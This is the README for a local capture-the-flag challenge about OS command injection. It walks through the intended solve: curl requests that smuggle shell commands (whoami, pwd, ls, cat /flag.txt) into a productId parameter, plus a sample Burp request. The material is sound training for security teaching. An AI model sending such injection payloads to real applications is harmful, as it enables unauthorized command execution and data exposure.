# IITCTF — Dynamic OS Command Injection

A local CTF challenge demonstrating a simple OS command injection vulnerability.

## Challenge concept

The application has a vulnerable `productId` parameter.

The intended path is:

```text
Find vulnerable parameter
        ↓
Command injection
        ↓
whoami
        ↓
Discover execution context
        ↓
Discover flag file
        ↓
Read flag
        ↓
IITCTF{random_dynamic_secret}
```

## Start

```bash
docker compose up --build
```

Open:

```text
http://127.0.0.1:8080/
```

## Intended solve

### 1. Normal request

```bash
curl "http://127.0.0.1:8080/stock?productId=1"
```

### 2. Test command injection

```bash
curl --get "http://127.0.0.1:8080/stock" \
  --data-urlencode 'productId=1; whoami'
```

The application runs as:

```text
ctfuser
```

### 3. Discover the working directory

```bash
curl --get "http://127.0.0.1:8080/stock" \
  --data-urlencode 'productId=1; pwd'
```

### 4. Discover files

```bash
curl --get "http://127.0.0.1:8080/stock" \
  --data-urlencode 'productId=1; ls -la /'
```

The intended target is:

```text
/flag.txt
```

### 5. Read the flag

```bash
curl --get "http://127.0.0.1:8080/stock" \
  --data-urlencode 'productId=1; cat /flag.txt'
```

The response contains a dynamically generated flag:

```text
IITCTF{<random_value>}
```

## Burp Suite

A representative request is:

```http
GET /stock?productId=1%3B%20whoami HTTP/1.1
Host: 127.0.0.1:8080
```

After confirming command execution, use Repeater to investigate the container
and read `/flag.txt`.

## Dynamic flags

A new random flag is generated every time the container starts.

Example instance:

```text
IITCTF{8b1f2d4e9a7c3b105f6a2d11}
```

A later fresh container instance gets a different value.

The flag is not derived from `whoami`; `whoami` is only an enumeration step.
The actual secret is stored in `/flag.txt`.

## Intended security model

- Application runs as `ctfuser`, not root.
- `/flag.txt` is owned by `ctfuser`.
- `/flag.txt` has mode `0400`.
- The flag is not exposed by an HTTP route.
- The vulnerable endpoint is the intended entry point.

## Important deployment note

This is intentionally vulnerable. Deploy it only inside your CTF challenge
infrastructure or another environment where you control access.
